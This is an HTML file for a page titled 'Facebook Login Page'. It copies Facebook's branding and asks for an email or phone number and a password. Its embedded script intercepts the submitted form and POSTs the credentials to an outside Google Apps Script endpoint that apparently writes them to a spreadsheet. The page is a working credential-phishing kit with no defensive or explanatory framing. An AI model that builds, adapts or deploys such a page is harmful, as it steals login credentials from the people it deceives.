<!DOCTYPE html>
<html>
<head>
	<title>Facebook Login Page</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
	<link rel="stylesheet" href="style.css">
</head>
<body>
	<div class="login-box">
		<i class="fa-brands fa-facebook"></i>
		<h2>Facebook</h2>
		<form name="submit-to-google-sheet">
			<p>Email or Phone</p>
			<input type="text" name="email" placeholder="Enter your email or phone number" required>
			<p>Password</p>
			<input type="password" name="password" placeholder="Enter your password" required>
			<input type="submit" name="submit" value="Log In">
			<p><a href="#">Forgotten password?</a></p>
		</form>
	</div>
    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbwtL4H2VQFOXf9FIGk6KU_pY8f0vN1mnMZQLxjksNUKOjlZeZ96h_1e035BVfLxF7_jxA/exec'
        const form = document.forms['submit-to-google-sheet']
      
        form.addEventListener('submit', e => {
          e.preventDefault()
          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
            .then(response => console.log('Success!', response))
            .catch(error => console.error('Error!', error.message))
        })
      </script>

</body>
</html>
